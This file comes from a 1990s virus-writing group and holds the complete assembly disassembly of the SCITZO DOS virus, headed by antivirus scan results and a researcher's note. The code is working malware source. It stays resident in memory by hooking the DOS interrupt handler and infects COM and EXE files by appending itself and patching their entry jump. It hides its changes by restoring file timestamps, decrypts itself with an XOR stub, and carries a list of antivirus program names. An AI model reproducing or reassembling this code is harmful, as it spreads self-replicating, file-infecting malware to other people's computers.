   ;
   ;           ÛÛÛÛÛÛÛ     Û        Û  ÛÛÛÛÛÛÛÛÛ  Û ÛÛÛÛÛÛÛÛ
   ;          Û       Û    Û        Û  Û          ÛÛÛ     ÛÛ
   ;         Û         Û   Û        Û  Û          Û       ÛÛ
   ;         ÛÛÛÛÛÛÛÛÛÛÛ   Û        Û  Û          Û
   ;         Û         Û   Û        Û  Û          Û
   ;         Û         Û    Û      Û   Û          Û
   ;         Û         Û     ÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ  Û
   ;
   ;
   ;
   ;       ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   Û      Û  ÛÛÛÛÛ   Û    Û    ÛÛÛÛÛ    Û
   ;       Û    Û       Û  Û      Û  Û    Û  ÛÛ   Û   Û     Û   Û
   ;       Û    Û       Û  Û      Û  ÛÛÛÛÛ   Û Û  Û  Û       Û  Û
   ;       Û     Û    Û       Û  Û      Û  Û  Û    Û  Û Û  ÛÛÛÛÛÛÛÛÛ  Û
   ;       Û     Û    Û       Û  Û      Û  Û   Û   Û   ÛÛ  Û       Û  Û
   ;        ÛÛÛÛÛ      ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   Û    Û  Û    Û  Û       Û  ÛÛÛÛÛÛ
   ;
   ;
   ;        Distributed By The American Virus Creation and Research Society
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Name Of Virus:  SCITZO
   ; -----------------------------------------------------------------------------
   ; Alias:
   ; -----------------------------------------------------------------------------
   ; Type Of Code:  Stealth
   ; -----------------------------------------------------------------------------
   ; VSUM Information - (NONE)
   ; -----------------------------------------------------------------------------
   ; Signature: Unknown
   ; -----------------------------------------------------------------------------
   ; Antivirus Detection:
   ; (1)
   ; ThunderByte Anti Virus (TBAV) reported SCITZO.COM as:
   ;     SCITZO.COM
   ;     probably infected by an unknown virus
   ;     c  No checksum / recovery information (Anti-Vir.Dat) available.
   ;     F  Suspicious file access.  Might be able to infect a file.
   ;     M  Memory resident code.  The program might stay resident in memory.
   ;     U  Undocumented interrupt/DOS call.  The program might be just tricky
   ;        but can also be a virus using a non-standard way to detect itself.
   ;     Z  EXE/COM determination.  The program tries to check whether a file
   ;        is a COM or EXE file.  Viruses need to do this to infect a program.
   ;     B  Back to entry point.  Contains code to re-start the program after
   ;        modifications at the entry-point are made.  Very usual for viruses.
   ;
   ; (2)
   ; Frisk Software's F-Protect (F-PROT) reported SCITZO.COM as nothing.
   ;
   ; (3)
   ; McAfee Softwares Anti Virus (SCAN.EXE) reported SCITZO.COM as nothing.
   ;
   ; (4)
   ; MicroSoft Anti Virus (MSAV.EXE) reported SCITZO.COM as nothing.
   ; -----------------------------------------------------------------------------
   ; Execution Results:
   ;      Upon execution SCITZO.COM did not change any checksums on any file
   ; contained within the hard disk.  The bait files were left untouched, but
   ; SCITZO.COM changed itself without changing its checksum.  No memory was
   ; noticably allocated for the virus.
   ; -----------------------------------------------------------------------------
   ; Researcher's Note:
   ;      If SCITZO.COM is, in fact, a virus then it is 100% stealth.  Checksums
   ; of files were left unscathed, as well as file dates \ sizes \ times of
   ; creation, etc.  Memory was also left as if never touched.  This might not
   ; be a virus, but in the disassembly there are some interesting things to note.
   ; For instance the "DB '.COM'" is rather suspicious, for it is defining a byte
   ; with ".COM" in it.  That leads me to believe that it checks for COM files,
   ; which is essential to the com infector.  Another supporter of the COM
   ; infection is when the program is getting bytes, it just so happens that it
   ; gets 3 bytes, the # of bytes where the JMP statement will now go, "mov  CX,3"
   ; was the preperation for the INT statement.
   ; -----------------------------------------------------------------------------
   ;
   ;
   ;
   ;           Complete Disassembly:

           PAGE    60,132


   data_1          =       1
   data_e          =       0Eh
   data_1d         =       1Dh
   data_34         =       34h
   data_36         =       36h
   data_44         =       44h
   data_e9         =       0E9h
   data_146        =       146h
   data_148        =       148h


   ;ÄÄÄÄÄÄÄÄÄÄ CODE_SEG_1  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   CODE_SEG_1      segment para public
           assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1


           org     100h


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              ENTRY POINT
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_start
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_start      proc    far
   start:          ; N-Ref=0
           mov     CX,0FFFFh
   loop_loc_2:             ; N-Ref=1
           mov     SI,621h
           loop    loop_loc_2              ; Loop if CX > 0
           nop                             ; No operation
           mov     AX,CS
           mov     DS,AX
           mov     SI,offset var1_16e
           mov     AL,0
           mov     AX,24Fh
           mov     CX,AX
           mov     AX,CX
           mov     CX,AX
   loop_loc_3:             ; N-Ref=1
           xor     Word Ptr [SI],+0
           nop                             ; 1 Fixup
           sub     SI,-2
           nop                             ; 1 Fixup
           loop    loop_loc_3              ; Loop if CX > 0
           jmp     short loc_5
   proc_start      endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_2
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_2          proc    near
           call    near ptr proc_3
           mov     AH,40h                  ; '@'
           mov     CX,49Ch
           mov     DX,69h
           pushf
           call    far ptr proc_1
           call    near ptr proc_3
           retn
   proc_2          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_3
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_3          proc    near
           mov     SI,69h
           mov     CX,24Fh
   loop_loc_4:             ; N-Ref=1
           xor     Word Ptr [SI],+0
           nop                             ; 1 Fixup
           inc     SI
           inc     SI
           loop    loop_loc_4              ; Loop if CX > 0
           retn
   proc_3          endp



           db      90h
   var1_14c        db      ' So, you''ve found this text? '
   loc_5:          ; N-Ref=1
           call    near ptr proc_4

   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_4
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_4          proc    near
           pop     SI
           sub     SI,+6Ch
           push    CS
           pop     DS
           mov     AX,0ABCDh
           int     21h
           cmp     AX,4148h
           je      loc_notfound            ; Jump if equal ( = )
           mov     AH,4Ah                  ; 'J'
           mov     BX,0FFFFh
           int     21h                     ; DOS func ( ah ) = 4Ah
                           ; Modify allocated memory block
                           ;BX-requested size,paragraphs
                           ; ES-seg addrs of block
                           ;if CF=1 AX-ret code
                           ; BX-max possible size if fail
           sub     BX,+52h
           mov     AH,4Ah                  ; 'J'
           int     21h                     ; DOS func ( ah ) = 4Ah
                           ; Modify allocated memory block
                           ;BX-requested size,paragraphs
                           ; ES-seg addrs of block
                           ;if CF=1 AX-ret code
                           ; BX-max possible size if fail
           mov     AH,48h                  ; 'H'
           mov     BX,51h
           int     21h                     ; DOS func ( ah ) = 48h
                           ; Allocate memory
                           ;BX-mem request in paragraphs
                           ;if CF=1 AX-ret code, else
                           ; AX-seg BX-block size if fail
           jb      loc_notfound            ; Jump if below ( < )
           dec     AX
           mov     ES,AX

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  ES:nothing
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           mov     Word Ptr ES:data_1,8
           inc     AX
           mov     ES,AX
           xor     DI,DI
           mov     CX,505h
           repz    movsb                   ; Repeat if ZF = 1, CX > 0
                           ; Move byte from DS:SI to ES:DI
           push    ES
           pop     DS

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  DS:nothing
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           mov     AX,3521h
           int     21h                     ; DOS func ( ah ) = 35h
                           ; Get interrupt vector
                           ;AL-interrupt number
                           ;ES:BX-interrupt vector
           mov     Word Ptr DS:data_146,BX
           mov     Word Ptr DS:data_148,ES
           mov     DX,12Dh
           mov     AX,2521h
           int     21h                     ; DOS func ( ah ) = 25h
                           ; Set interrupt vector
                           ;AL-intrpt number
                           ; DS:DX-intrpt handler
           push    CS
           pop     DS

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  DS:CODE_SEG_1
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           call    near ptr loc_notfound
           inc     BX
           cmp     BL,Byte Ptr [SI+44h]
           dec     DI
           push    BX
           pop     SP
           inc     BP
           inc     SP
           dec     CX
           push    SP

   var1_1ce        db      '.COM'
           db      0, 5Ah, 0B8h, 2, 3Dh, 0CDh
           db      21h, 93h, 0B4h, 3Eh, 0CDh, 21h
           db      0Eh, 0Eh, 1Fh, 7, 0E8h, 0Ah
           db      0, 0B8h, 0, 4Ch, 0E9h, 2
           db      0, 0
   loc_7:          ; N-Ref=1
           jmp     far ptr loc_notfound

           dw      67Ch, 7500h, 0BF0Ah, offset start
           db      0A5h, 0A4h, 0B8h, 0, 1, 0FFh
           db      0E0h
   loc_8:          ; N-Ref=1
           mov     AX,CS
           add     AX,1234h
           mov     Word Ptr [SI+0Ah],AX
           push    SS
           pop     AX
           sub     AX,10h
           mov     ES,AX
           mov     DS,AX

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  DS:nothing
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           push    SS
           pop     AX
           add     AX,1234h
           mov     BX,1234h
           cli                             ; Disable interrupts
           mov     SS,AX

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  SS:nothing
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           mov     SP,BX
           sti                             ; Enable interrupts
           xor     AX,AX
           xor     BX,BX
           xor     CX,CX
           xor     DX,DX
           xor     SI,SI
           xor     DI,DI
           jmp     short loc_7

           dw      0CD3Dh, 75ABh, 0B804h, 4148h
           dw      3DCFh, 4B00h, 774h, 0FC80h
   var1_23d        db      3Dh, 74h, 0Ah, 0EBh, 3
   loc_9:          ; N-Ref=1
           call    near ptr proc_7
   proc_4          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_6
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_6          proc    near
   loc_10:         ; N-Ref=2
           jmp     far ptr loc_1

           dw      657h, 5051h, 71Eh, 40B9h
           dw      8B00h, 0B0FAh, 0F22Eh, 58AEh
           dw      8159h
           db      '=COu'
           dw      8008h, 27Dh, 754Dh, 0EB02h
           db      0Ch
   loc_11:         ; N-Ref=2
           cmp     Word Ptr [DI],5845h
           jne     loc_13                  ; Jump if not equal ( != )
           cmp     Byte Ptr [DI+2],45h     ; 'E'
           jne     loc_13                  ; Jump if not equal ( != )
   loc_12:         ; N-Ref=1
           pop     ES
           pop     DI
           call    near ptr proc_7
           jmp     short loc_10
   loc_13:         ; N-Ref=2
           pop     ES
           pop     DI
           call    near ptr proc_8
           jmp     short loc_10
   proc_6          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_7
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_7          proc    near
           push    AX
           push    BX
           push    CX
           push    DX
           push    DS
           push    ES
           push    CS
           pop     ES

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  ES:CODE_SEG_1
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           cld                             ; Clear direction flag
           mov     DI,offset var1_4c9
           mov     CX,0Ch
   loop_loc_14:            ; N-Ref=1
           mov     SI,DX
           lodsw                           ; Load word at DS:SI to AX
           scasw                           ; Scan DS:SI for word in AX
           je      loc_15                  ; Jump if equal ( = )
           inc     DI
           loop    loop_loc_14             ; Loop if CX > 0
           jmp     short loc_16
   loc_15:         ; N-Ref=1
           lodsb                           ; Load byte at DS:SI to AL
           scasb                           ; Scan DS:SI for byte in AL

   var1_29f        dw      840Fh
   var1_2a1        dw      19Dh
   loc_16:         ; N-Ref=1
           mov     AX,3D02h
           pushf
           push    CS
           call    near ptr proc_6
           jnb     loc_17                  ; Jump if not below ( >= )
           jmp     loc_19
   loc_17:         ; N-Ref=1
           mov     BX,AX
           push    CS
           pop     DS

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           assume  DS:CODE_SEG_1
   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

           mov     AX,5700h
           int     21h                     ; DOS func ( ah ) = 57h
                           ; Get/set file date and time
                           ;AL-(0/1)get/set flag BX-handle
                           ; CX/DX-time/date,if AL=1
                           ;if CF=1 AX-extended err code
                           ; CX/DX-time/date if AL=0
           mov     Word Ptr var1_2a3,DX    ; [603D:02A3] = 2B8h
           mov     Word Ptr var1_2a1,CX    ; [603D:02A1] = 19Dh
           and     CL,1Fh
           cmp     CL,3

           dw      840Fh, 175h, 3FB4h, 0E5BAh
           dw      0B900h, 3, 21CDh, 3E81h
           dw      0E5h
   var1_2d9        db      'MZt'
           db      16h, 81h, 3Eh, 0E5h, 0
   var1_2e1        db      'ZMt'
           db      0Eh, 81h, 3Eh, 0E5h, 0, 0E9h
           db      80h, 74h, 3, 0E9h, 0D2h, 0
           db      0E9h, 4Dh, 1, 0BEh, 0EBh, 0
           db      0C6h, 4, 1, 0B8h, 0, 42h
           db      33h, 0C9h, 33h, 0D2h, 0CDh, 21h
           db      0B4h, 3Fh, 0BAh, 0EDh, 4, 0B9h
           db      18h, 0, 0CDh, 21h, 0B8h, 2
           db      42h, 33h, 0C9h, 33h, 0D2h, 0CDh
           db      21h, 0A3h, 9Fh, 2, 3Dh, 0FAh
           db      0FAh, 0Fh, 87h, 21h, 1, 0Bh
           db      0D2h, 0Fh, 85h, 1Bh, 1, 8Bh
           db      16h, 0F5h, 4, 0B1h, 4, 0D3h
           db      0E2h, 2Bh, 0C2h, 0A3h, 9Dh, 2
           db      8Bh, 0D0h, 81h, 0C2h, 69h, 0
           db      89h, 16h, 0Eh, 0, 0A1h, 1
           db      5, 0A3h, 0EDh, 0, 0A1h, 3
           db      5, 0A3h, 3, 1, 0A1h, 0FBh
           db      4, 0A3h, 14h, 1, 0A1h, 0FDh
           db      4, 0A3h, 17h, 1, 0E8h, 0D6h
           db      1, 0E8h, 9Ah, 1, 0A1h, 9Fh
           db      2, 33h, 0D2h, 5, 5, 5
           db      0B9h, 0, 2, 0F7h, 0F1h, 40h
           db      89h, 16h, 0EFh, 4, 0A3h, 0F1h
           db      4, 0C7h, 6, 0FBh, 4, 0
           db      0, 0C7h, 6, 0FDh, 4, 0FFh
           db      0FFh, 0C7h, 6, 3, 5, 0
           db      0, 0A1h, 9Dh, 2, 0A3h, 1
           db      5, 0B8h, 0, 42h, 33h, 0C9h
           db      33h, 0D2h, 0CDh, 21h, 0B4h, 40h
           db      0BAh, 0EDh, 4, 0B9h, 18h, 0
           db      0CDh, 21h, 0E9h, 0A3h
           db      9 dup (0)
   var1_3a5        db      0Dh, 0Ah
           db      'I fee'
   var1_3ac        db      'l a little scitzo...'
           dw      0A0Dh
   loc_18:         ; N-Ref=0
           mov     SI,0EBh
           mov     Byte Ptr [SI],0
           mov     AX,4202h
           xor     CX,CX
           xor     DX,DX
           int     21h                     ; DOS func ( ah ) = 42h
                           ; Move file pointer
                           ;AL-method code BX-file handle
                           ; CX_DX-offset value
                           ;if CF=1 AX-ret code
                           ; DX_AX-new ptr location
           mov     DX,AX
           add     DX,offset loc_5
           mov     Word Ptr DS:data_e,DX   ; [603D:000E] = 0B20h
           sub     AX,3
           mov     Word Ptr DS:data_e9,AX  ; [603D:00E9] = 200Bh
           call    near ptr proc_12
           call    near ptr proc_10
           mov     AX,4200h
           xor     CX,CX
           xor     DX,DX
           int     21h                     ; DOS func ( ah ) = 42h
                           ; Move file pointer
                           ;AL-method code BX-file handle
                           ; CX_DX-offset value
                           ;if CF=1 AX-ret code
                           ; DX_AX-new ptr location
           mov     AH,40h                  ; '@'
           mov     CX,3
           mov     DX,0E8h
           int     21h                     ; DOS func ( ah ) = 40h
                           ; Write to file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
           jmp     short loc_19

   ;ÍÍÍÍÍÍÍÍÍÍ External Entry into current procedure  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   proc_8:
           push    AX
           push    BX
           push    CX
           push    DX
           push    DS
           push    ES
           mov     AX,3D02h
           pushf
           push    CS
           call    near ptr proc_6
           jb      loc_19                  ; Jump if below ( < )
           xchg    BX,AX
           mov     AX,5700h
           int     21h                     ; DOS func ( ah ) = 57h
                           ; Get/set file date and time
                           ;AL-(0/1)get/set flag BX-handle
                           ; CX/DX-time/date,if AL=1
                           ;if CF=1 AX-extended err code
                           ; CX/DX-time/date if AL=0
           mov     Word Ptr var1_2a3,DX    ; [603D:02A3] = 2B8h
           mov     Word Ptr var1_2a1,CX    ; [603D:02A1] = 19Dh
           and     CL,1Fh
           cmp     CL,3
           je      loc_19                  ; Jump if equal ( = )
           mov     AH,2Ch                  ; ','
           int     21h                     ; DOS func ( ah ) = 2Ch
                           ; Get time
                           ;CL-min CH-hours DH-seconds
                           ; DL-1/100 of secs
           cmp     DL,0
           jne     loc_19                  ; Jump if not equal ( != )
           mov     AX,4202h
           xor     CX,CX
           xor     DX,DX
           int     21h                     ; DOS func ( ah ) = 42h
                           ; Move file pointer
                           ;AL-method code BX-file handle
                           ; CX_DX-offset value
                           ;if CF=1 AX-ret code
                           ; DX_AX-new ptr location
           push    CS
           pop     DS
           mov     AH,40h                  ; '@'
           mov     DX,offset var1_2a5
           mov     CX,1Dh
           int     21h                     ; DOS func ( ah ) = 40h
                           ; Write to file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
   loc_19:         ; N-Ref=5
           push    CS
           pop     DS
           mov     AX,5701h
           mov     CX,Word Ptr var1_2a1    ; [603D:02A1] = 19Dh
           mov     DX,Word Ptr var1_2a3    ; [603D:02A3] = 2B8h
           and     CL,0E0h
           or      CL,3
           int     21h                     ; DOS func ( ah ) = 57h
                           ; Get/set file date and time
                           ;AL-(0/1)get/set flag BX-handle
                           ; CX/DX-time/date,if AL=1
                           ;if CF=1 AX-extended err code
                           ; CX/DX-time/date if AL=0
           mov     AH,3Eh                  ; '>'
           int     21h                     ; DOS func ( ah ) = 3Eh
                           ; Close file handle
                           ;BX-file handle
                           ;if CF=1 AX-ret code
           pop     ES
           pop     DS
           pop     DX
           pop     CX
           pop     BX
           pop     AX
           retn
   proc_7          endp



   var1_460        db      ' SCITZO - by "RED A", Lund, Sweden 1994 '
           db      0B8h, 8Bh, 0F0h, 0BBh, 87h, 0F3h
           db      0BEh, 0B0h, 0, 0B8h, 4Fh, 2
           db      8Bh, 0C8h, 8Bh, 0C1h, 8Bh, 0C8h
           db      0BBh, 83h, 14h, 81h, 0EBh, 34h
           db      12h, 87h, 0CBh, 0BFh, 0D7h, 0ABh
           db      81h, 0C7h
   loop_loc_20:            ; N-Ref=1
           js      loc_27                  ; Jump on sign ( < 0 )
           mov     CX,DI
           inc     SI
           inc     SI
   loop_loc_21:            ; N-Ref=1
           loop    loop_loc_20             ; Loop if CX > 0
           dec     BX
           inc     BX
           add     SI,+2
           loop    loop_loc_21             ; Loop if CX > 0
           inc     DI
           sub     SI,-2
           nop                             ; 1 Fixup
           loop    loop_loc_22             ; Loop if CX > 0
           mov     CX,0FFFFh
   loop_loc_23:            ; N-Ref=1
           mov     SI,621h
           loop    loop_loc_23             ; Loop if CX > 0
           nop                             ; No operation
           add     CX,8077h
   loop_loc_24:            ; N-Ref=1
           mov     SI,2133h
           loopnz  loop_loc_24             ; Loop if ZF = 0, CX > 0
           sub     CX,0ABCDh
   loop_loc_25:            ; N-Ref=1
           mov     DI,2333h
           loop    loop_loc_25             ; Loop if CX > 0
           mov     AX,CS
           mov     DS,AX
           mov     DX,CS
           mov     DS,DX
           mov     AH,27h                  ; '''
           push    CS
           pop     DS

   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_9
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_9          proc    near
           mov     SI,27h
           mov     CX,21h
   loop_loc_26:            ; N-Ref=1
           xor     Word Ptr [SI],+0
           nop                             ; 1 Fixup
           inc     SI
           inc     SI
           loop    loop_loc_26             ; Loop if CX > 0
           retn
   proc_9          endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_10
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_10         proc    near
           call    near ptr proc_9
           mov     AH,2Ch                  ; ','
           int     21h                     ; DOS func ( ah ) = 2Ch
                           ; Get time
                           ;CL-min CH-hours DH-seconds
                           ; DL-1/100 of secs
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 200Bh
           mov     Word Ptr DS:data_44,DX  ; [603D:0044] = 0B20h
           mov     Word Ptr var1_3ed,DX    ; [603D:03ED] = 0CDD2h
           call    near ptr proc_9
           mov     AH,40h                  ; '@'
           mov     CX,69h
           xor     DX,DX
           int     21h                     ; DOS func ( ah ) = 40h
                           ; Write to file or device
                           ;BX-file handle
                           ; CX-bytes to read  DS:DX-DTA
                           ;if CF=0 AX-bytes read
                           ; else AX-ret code
           call    near ptr proc_9
           call    near ptr proc_11
           retn
   proc_10         endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_11
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_11         proc    near
           mov     AX,Word Ptr var1_146    ; [603D:0146] = 4646h
           mov     Word Ptr DS:data_34,AX  ; [603D:0034] = 0B20h
           mov     AX,Word Ptr var1_148    ; [603D:0148] = 0F8E2h
           mov     Word Ptr DS:data_36,AX  ; [603D:0036] = 0B20h
           call    near ptr proc_3
           call    near ptr proc_9
           retn
   proc_11         endp



   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;±
   ;±              PROCEDURE proc_12
   ;±
   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

   proc_12         proc    near
           mov     AH,2Ch                  ; ','
           int     21h                     ; DOS func ( ah ) = 2Ch
                           ; Get time
                           ;CL-min CH-hours DH-seconds
                           ; DL-1/100 of secs
           push    DS
           pop     ES
           mov     AX,DX
           and     AX,3
           cmp     AL,3
           jne     loc_28                  ; Jump if not equal ( != )
           dec     AL
   loc_28:         ; N-Ref=1
           mov     CL,3
           mul     CL                      ; AX = AL * data
           mov     SI,388h
           add     SI,AX
           mov     DI,0Dh
           movsb                           ; Move byte from DS:SI to ES:DI
           inc     DI
           inc     DI
           movsw                           ; Move word from DS:SI to ES:DI
           mov     AX,DX

           dw      0E8C1h, 2502h, 3, 33Ch
           dw      offset loc_12
           dw      0C8FEh, 9B1h, 0E1F6h
           dw      91BEh, 303h, 0BFF0h, 12h
           db      4 dup (0A5h)
           dw      8BA4h, 0C1C2h, 4E8h, 325h
           dw      3C00h, 7503h, 0FE02h, 0B1C8h
           dw      0F606h, 0BEE1h, var1_3ac, 0F003h
           dw      1FBFh, 0A500h, 0A5A5h, 2CB4h
           dw      21CDh, 0C28Bh, 0E8C1h, 2503h
           dw      3, 33Ch, offset loc_12
           dw      0C8FEh
           dw      9B1h, 0E1F6h, 0BEBEh, 303h
           dw      0BFF0h, 0
           db      4 dup (0A5h)
           dw      8BA4h, 0D1C2h, 25E8h, 3
           dw      33Ch, offset loc_12
           dw      0C8FEh
   loc_29:         ; N-Ref=1
           mov     CL,4
           mul     CL                      ; AX = AL * data
           mov     SI,offset var1_3d9
           add     SI,AX
           mov     DI,0
           movsw                           ; Move word from DS:SI to ES:DI
           movsw                           ; Move word from DS:SI to ES:DI
           retn
   proc_12         endp



   var1_5c9        db      'TBATBSF-PVSHMSATBCCPAVSAVIRSCACLETOO'
           db      24 dup (0)
   CODE_SEG_1      ends



           end     start


           Run Once, and Comapared to Original (Above):

   ; FILE CREATED BY FILE COMPARE v.1.2
   ; DEVELOPED BY:
   ; MICRO PROFESSOR SOFTWARE,
   ; ALONG WITH AMATEUR VIRUS CREATION & RESEARCH GROUP.
   ; ASCII CODE!

   ;----------------------------------------------------------------------------
